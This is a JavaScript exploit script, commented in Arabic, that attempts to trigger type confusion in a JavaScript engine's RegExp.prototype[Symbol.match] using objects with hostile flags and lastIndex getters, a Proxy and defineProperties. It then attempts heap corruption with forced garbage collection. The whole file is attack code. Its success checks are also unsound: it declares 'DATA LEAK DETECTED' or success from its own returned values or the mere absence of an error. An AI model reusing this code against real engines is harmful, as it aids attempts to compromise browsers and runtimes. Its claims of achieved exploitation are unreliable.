import { log, sleep } from './module/utils.mjs';

class RegExpFlagsExploit {
    constructor() {
        this.marker = 0x42424242;
    }

    async execute() {
        // المرحلة 1: إنشاء type confusion
        await this.createTypeConfusion();
        
        // المرحلة 2: استغلال الـ confusion للحصول على primitives
        return await this.exploitConfusion();
    }

    async createTypeConfusion() {
        log("Creating RegExp flags type confusion...");
        
        const maliciousRegexp = this.createMaliciousRegexp();
        
        // اختبار الـ Symbol.match على الكائن الخبيث
        try {
            const result = RegExp.prototype[Symbol.match].call(maliciousRegexp, "test string");
            log(`Match result: ${result}`);
        } catch (e) {
            log(`Error during match: ${e}`);
        }
    }

    createMaliciousRegexp() {
        // إنشاء كائن يخدع RegExp.prototype[Symbol.match]
        const malicious = {
            // محاكاة RegExp لكن مع سلوك خبيث
            exec: function(str) {
                log("Malicious exec called");
                return ["matched"];
            },
            
            // الـ getter الخبيث لـ flags
            get flags() {
                log("Malicious flags getter called");
                
                // هنا يمكننا إرجاع أي شيء لتسبب type confusion
                return {
                    toString: function() {
                        log("Malicious flags toString called");
                        return "g"; // أو أي قيمة أخرى تسبب confusion
                    },
                    valueOf: function() {
                        return "gu";
                    }
                };
            },
            
            // محاولة للتأثير على lastIndex
            get lastIndex() {
                log("Malicious lastIndex getter");
                return 0;
            },
            set lastIndex(value) {
                log(`Malicious lastIndex set to: ${value}`);
            }
        };

        return malicious;
    }

    async exploitConfusion() {
        log("Attempting to exploit type confusion...");
        
        // استراتيجية 1: استخدام Proxy للتلاعب بالوصول للخصائص
        const proxyExploit = await this.proxyBasedExploit();
        if (proxyExploit) return true;
        
        // استراتيجية 2: استخدام Object.defineProperty
        const definePropExploit = await this.definePropertyExploit();
        if (definePropExploit) return true;
        
        return false;
    }

    async proxyBasedExploit() {
        log("Trying Proxy-based exploitation...");
        
        let accessOrder = [];
        const maliciousProxy = new Proxy({}, {
            get: function(target, property, receiver) {
                accessOrder.push(property);
                log(`Proxy get: ${String(property)}`);
                
                if (property === 'flags') {
                    // إرجاع كائن معقد يسبب confusion
                    return {
                        [Symbol.toPrimitive]() { return "g"; },
                        valueOf() { return "gu"; },
                        toString() { return "gi"; }
                    };
                }
                
                if (property === 'exec') {
                    return function(str) {
                        log("Proxy exec called");
                        return ["exploit"];
                    };
                }
                
                return undefined;
            },
            
            set: function(target, property, value, receiver) {
                log(`Proxy set: ${String(property)} = ${value}`);
                if (property === 'lastIndex') {
                    // يمكن استغلال كتابة lastIndex
                }
                return true;
            }
        });
        
        try {
            const result = RegExp.prototype[Symbol.match].call(maliciousProxy, "test");
            log(`Proxy exploit result: ${result}`);
            log(`Access order: ${accessOrder.join(', ')}`);
            return true;
        } catch (e) {
            log(`Proxy exploit failed: ${e}`);
            return false;
        }
    }

    async definePropertyExploit() {
        log("Trying Object.defineProperty exploitation...");
        
        const obj = {};
        let callCount = 0;
        
        Object.defineProperties(obj, {
            flags: {
                get: function() {
                    callCount++;
                    log(`Flags getter called ${callCount} times`);
                    
                    // بعد عدة استدعاءات، غير السلوك
                    if (callCount > 5) {
                        return {
                            toString: function() {
                                // إرجاع قيمة مختلفة لتسبب inconsistency
                                return callCount % 2 === 0 ? "g" : "u";
                            }
                        };
                    }
                    return "g";
                }
            },
            
            exec: {
                value: function(str) {
                    log(`Exec called with: ${str}`);
                    // إرجاع مصفوفة مع بيانات مسربة
                    return [str.substring(0, 10), callCount, this.marker];
                }
            },
            
            global: { value: true },
            unicode: { value: false }
        });
        
        // إضافة marker للكشف عن التسريبات
        obj.marker = this.marker;
        
        try {
            const result = RegExp.prototype[Symbol.match].call(obj, "A".repeat(1000));
            log(`DefineProperty result: ${result}`);
            
            // تحقق إذا كانت هناك بيانات مسربة
            if (result && result.length > 1 && result[2] === this.marker) {
                log("DATA LEAK DETECTED!");
                return true;
            }
        } catch (e) {
            log(`DefineProperty exploit failed: ${e}`);
        }
        
        return false;
    }

    // استغلال متقدم باستخدام الـ confusion للحصول على addrof/fakeobj
    async advancedExploitation() {
        log("Attempting advanced exploitation for memory corruption...");
        
        // إنشاء كائنات للاستغلال
        const victimArrays = [];
        for (let i = 0; i < 10; i++) {
            victimArrays.push(new Array(100).fill(i));
        }
        
        const exploitObj = this.createAdvancedExploitObject(victimArrays);
        
        try {
            const result = RegExp.prototype[Symbol.match].call(exploitObj, "trigger");
            log(`Advanced exploit result: ${result}`);
            
            // تحقق من تلف الذاكرة
            for (let i = 0; i < victimArrays.length; i++) {
                const arr = victimArrays[i];
                for (let j = arr.length; j < arr.length + 10; j++) {
                    if (arr[j] !== undefined) {
                        log(`MEMORY CORRUPTION: array ${i} at index ${j} = ${arr[j]}`);
                        return true;
                    }
                }
            }
        } catch (e) {
            log(`Advanced exploit crashed: ${e}`);
        }
        
        return false;
    }

    createAdvancedExploitObject(victimArrays) {
        return {
            get flags() {
                // محاولة التسبب في heap corruption
                const largeString = "A".repeat(10000);
                victimArrays.push(largeString);
                return "g";
            },
            
            exec: function(str) {
                // تنفيذ خبيث أثناء الـ exec
                gc(); // إجبار GC أثناء العملية
                return [str];
            },
            
            get lastIndex() {
                return 0;
            },
            
            set lastIndex(value) {
                // كتابة خبيثة لـ lastIndex
                if (value > 1000000) {
                    log(`SUSPICIOUS lastIndex: ${value}`);
                }
            }
        };
    }
}

// التشغيل الرئيسي
async function main() {
    const exploit = new RegExpFlagsExploit();
    
    log("Starting RegExp flags type confusion exploit...");
    
    const success = await exploit.execute();
    if (success) {
        log("Type confusion likely achieved!");
        
        // حاول الاستغلال المتقدم
        const advanced = await exploit.advancedExploitation();
        if (advanced) {
            log("ADVANCED EXPLOITATION SUCCESSFUL!");
        }
    } else {
        log("Exploitation attempts completed");
    }
}

main();